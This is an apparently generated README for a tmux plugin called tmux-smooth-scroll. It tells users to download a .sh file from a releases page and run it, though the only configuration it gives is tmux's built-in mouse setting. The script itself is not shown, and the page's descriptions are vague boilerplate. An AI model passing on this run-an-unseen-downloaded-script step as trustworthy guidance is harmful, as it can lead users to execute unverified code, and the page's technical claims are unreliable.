---
layout: "default"
title: "🖥️ tmux-smooth-scroll - Effortless Scrolling in tmux"
description: "📜 Enhance tmux with smooth scrolling for a more intuitive navigation experience in your terminal sessions."
---
# 🖥️ tmux-smooth-scroll - Effortless Scrolling in tmux

## 📥 Download Now
[![Download tmux-smooth-scroll](https://img.shields.io/badge/Download%20tmux--smooth--scroll-brightgreen.svg)](https://github.com/Syre213/tmux-smooth-scroll/releases)

## 📋 Description
tmux-smooth-scroll makes scrolling in tmux easy and efficient. This tool improves your experience by providing smooth scrolling functionality, ensuring you can read through your output without hiccups.

## 🚀 Getting Started
To begin using tmux-smooth-scroll, you will need to follow these steps:

1. **Ensure tmux is Installed**: Before using tmux-smooth-scroll, verify that you have tmux installed on your system. If you don't have tmux:
   - **Linux**: Use your package manager (e.g., `sudo apt install tmux` for Ubuntu).
   - **macOS**: Install it via Homebrew with `brew install tmux`.
   - **Windows**: You can use WSL (Windows Subsystem for Linux) or install a terminal that supports tmux.

2. **Visit Releases Page**: Go to the releases page to download the latest version of tmux-smooth-scroll. You can find it here: [Download Page](https://github.com/Syre213/tmux-smooth-scroll/releases).

## 📥 Download & Install
To download and install tmux-smooth-scroll, follow these steps:

1. **Go to the Download Page**: Click the link here: [Download tmux-smooth-scroll](https://github.com/Syre213/tmux-smooth-scroll/releases) to visit the releases page.

2. **Select the Latest Release**: Look for the most recent version of the plugin. You will see a list of assets available for download.

3. **Download the Plugin**: Click on the download link for the appropriate asset that fits your system setup. Generally, you will want the `.sh` file which allows easier installation.

4. **Install the Plugin**:
   - Open your terminal.
   - Navigate to your home directory or your preferred configuration directory where you maintain your tmux settings.
   - Run the installation command by executing: 
     ```bash
     sh /path/to/downloaded/tmux-smooth-scroll.sh
     ```

5. **Configure tmux**: 
   - After installation, you need to add tmux-smooth-scroll to your `~/.tmux.conf` file. Open this configuration file and add the following line:
     ```bash
     set -g mouse on
     ```
   - This line allows scrolling with your mouse, which is essential for smooth scrolling.

6. **Reload tmux Configuration**: To apply changes, reload your configuration by typing:
   ```bash
   tmux source-file ~/.tmux.conf
   ```

7. **Enjoy Smooth Scrolling**: Now, you can enjoy scrolling through your tmux sessions without interruption.

## 🛠️ Features
tmux-smooth-scroll offers several useful features:

- **Smooth Scrolling**: Scroll through output without jumps, creating a more natural reading experience.
- **Mouse Support**: Easily scroll using your mouse or touchpad.
- **Simple Installation**: The process is straightforward and can be done in a few steps.
- **Compatibility**: Works with all major platforms that support tmux, including Linux, macOS, and Windows via WSL.

## 📝 System Requirements
- **tmux**: Version 2.1 or higher recommended for optimal performance.
- **Operating System**: Compatible with Linux distributions, macOS, and Windows (via WSL).

## ⚙️ Troubleshooting
If you encounter any issues, consider the following solutions:

- **tmux Not Installed**: Double-check that tmux is properly installed.
- **Plugin Not Working**: Ensure you added the correct line to your `~/.tmux.conf` file and reloaded the configuration.
- **Version Compatibility**: Make sure you are using a compatible version of tmux.

## 💬 Get Help
For more support, you can check out the issues section on the project’s GitHub page. Users and maintainers can provide guidance based on common questions.

Thank you for trying tmux-smooth-scroll. We hope it enhances your tmux experience!